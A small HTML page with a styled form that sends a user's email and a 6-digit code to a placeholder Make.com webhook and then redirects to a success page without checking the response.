<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Verify</title>

<style>
  * {
    box-sizing: border-box;
    font-family: 'Segoe UI', sans-serif;
  }

  body {
    margin: 0;
    background: linear-gradient(135deg, #f0f2f5, #e6e9f0);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .card {
    background: white;
    padding: 30px;
    border-radius: 18px;
    width: 360px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.12);
  }

  h2 {
    text-align: center;
    margin-bottom: 20px;
  }

  input {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    border-radius: 10px;
    border: 1px solid #ddd;
  }

  button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border: none;
    border-radius: 10px;
    background: #6c63ff;
    color: white;
    font-weight: bold;
    cursor: pointer;
  }

  button:hover {
    background: #574fd6;
  }
</style>
</head>

<body>

<div class="card">
  <h2>Enter Code</h2>

  <input id="code" placeholder="6-digit code">

  <button onclick="verify()">Verify</button>
</div>

<script>
const WEBHOOK_VERIFY = "https://hook.eu1.make.com/YOUR_VERIFY";

const email = new URLSearchParams(window.location.search).get("email");

function verify() {
  const code = document.getElementById("code").value;

  fetch(WEBHOOK_VERIFY + `?email=${encodeURIComponent(email)}&code=${encodeURIComponent(code)}`);

  alert("Checking...");
  window.location.href = "success.html";
}
</script>

</body>
</html>
